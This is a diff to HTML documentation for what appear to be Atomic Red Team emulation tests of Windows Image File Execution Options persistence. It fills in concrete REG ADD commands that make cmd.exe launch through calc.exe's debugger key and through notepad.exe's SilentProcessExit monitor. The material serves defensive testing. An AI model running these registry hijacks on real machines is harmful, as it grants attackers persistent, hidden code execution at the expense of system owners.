@@ -730,10 +730,11 @@
 <div class="section" id="atomic-test-1-ifeo-add-debugger">
 <h3>Atomic Test #1 - IFEO Add Debugger<a class="headerlink" href="#atomic-test-1-ifeo-add-debugger" title="Permalink to this headline">¶</a></h3>
 <p>Leverage Global Flags Settings</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="attack-commands-run-with-command-prompt">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#attack-commands-run-with-command-prompt" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}&quot; /v Debugger /d &quot;#{payload_binary}&quot;
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\C:\Windows\System32\calc.exe&quot; /v Debugger /d &quot;C:\Windows\System32\cmd.exe&quot;
 </pre></div>
 </div>
 <div class="cell docutils container">
@@ -748,12 +749,13 @@
 <div class="section" id="atomic-test-2-ifeo-global-flags">
 <h3>Atomic Test #2 - IFEO Global Flags<a class="headerlink" href="#atomic-test-2-ifeo-global-flags" title="Permalink to this headline">¶</a></h3>
 <p>Leverage Global Flags Settings</p>
-<p><strong>Supported Platforms:</strong> windows</p>
+<p><strong>Supported Platforms:</strong> windows
+Elevation Required (e.g. root or admin)</p>
 <div class="section" id="id1">
 <h4>Attack Commands: Run with <code class="docutils literal notranslate"><span class="pre">command_prompt</span></code><a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h4>
-<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_binary}&quot; /v GlobalFlag /t REG_DWORD /d 512
-REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}&quot; /v ReportingMode /t REG_DWORD /d 1
-REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\#{target_binary}&quot; /v MonitorProcess /d &quot;#{payload_binary}&quot;
+<div class="highlight-command_prompt notranslate"><div class="highlight"><pre><span></span>REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\C:\Windows\System32\notepad.exe&quot; /v GlobalFlag /t REG_DWORD /d 512
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\C:\Windows\System32\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1
+REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\C:\Windows\System32\notepad.exe&quot; /v MonitorProcess /d &quot;C:\Windows\System32\cmd.exe&quot;
 </pre></div>
 </div>
 <div class="cell docutils container">
